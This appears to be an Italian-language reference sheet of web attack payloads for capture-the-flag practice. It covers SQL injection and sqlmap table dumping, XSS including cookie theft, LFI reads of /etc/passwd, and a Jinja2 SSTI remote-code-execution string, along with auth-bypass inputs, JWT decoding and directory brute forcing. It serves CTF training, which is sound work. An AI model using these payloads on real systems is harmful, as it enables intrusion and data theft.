# 🌐 Scheda di riferimento per le CTF web

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../Web-CTF.md) • [🇹🇷 Türkçe Sürüm](Web-CTF.tr.md) • [🇬🇷 Ελληνικά](Web-CTF.el.md)

---

## 💉 SQL Injection

### Payload di base
```sql
' OR 1=1--
' OR '1'='1
" OR ""="
admin'--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
```

### SQLMap
```bash
sqlmap -u "http://url?id=1" --dbs
sqlmap -u "http://url?id=1" -D dbname --tables
sqlmap -u "http://url?id=1" -D dbname -T users --dump
```

---

## 📜 XSS (Cross-Site Scripting)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
```

---

## 📁 LFI (Local File Inclusion)

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

---

## 🔧 SSTI (Server-Side Template Injection)

### Rilevamento
```
{{7*7}}     → 49 (Jinja2/Twig)
${7*7}      → 49 (Freemarker)
<%= 7*7 %>  → 49 (ERB)
```

### Esecuzione di codice remoto (RCE) con Jinja2
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

## 🔐 Bypass dell'autenticazione

```
admin' --
admin'/*
' OR 1=1 LIMIT 1--
Password: ' OR '1'='1
```

---

> **Nota sugli esempi:** il byte nullo `%00` nella sezione LFI è una tecnica legata a vecchie versioni e non è un bypass generale nei runtime moderni. Gli esempi SSTI dipendono dal motore, dalla configurazione e dagli oggetti disponibili.

## 🍪 Cookie/JWT

```bash
# Decodifica JWT
echo "eyJ..." | base64 -d

# Strumenti
jwt_tool.py token
jwt.io (online)
```

---

> **Nota JWT:** un token JWT completo non è un unico valore Base64. Le parti sono separate da punti e usano Base64url; decodificare il contenuto non verifica la firma. Il comando abbreviato originale è conservato come esempio indicativo.

## 🛠️ Strumenti utili

```bash
# Ricerca delle directory tramite brute force
gobuster dir -u http://url -w wordlist.txt

# Fuzzing
ffuf -u http://url/FUZZ -w wordlist.txt

# Individuazione dei parametri
arjun -u http://url
```

---

## 📋 Checklist per le CTF web

```markdown
□ Esamina il codice sorgente (Ctrl+U)
□ Controlla robots.txt e sitemap.xml
□ Esamina cookie e JWT
□ Verifica gli input per SQL injection (SQLi)
□ Verifica gli input per XSS
□ Verifica i parametri dei file per LFI
□ Verifica la presenza di SSTI
□ Cerca directory tramite brute force
□ Verifica se .git è esposto
```

---

**Torna alle CTF:** [🏁 Panoramica CTF](./README.it.md)
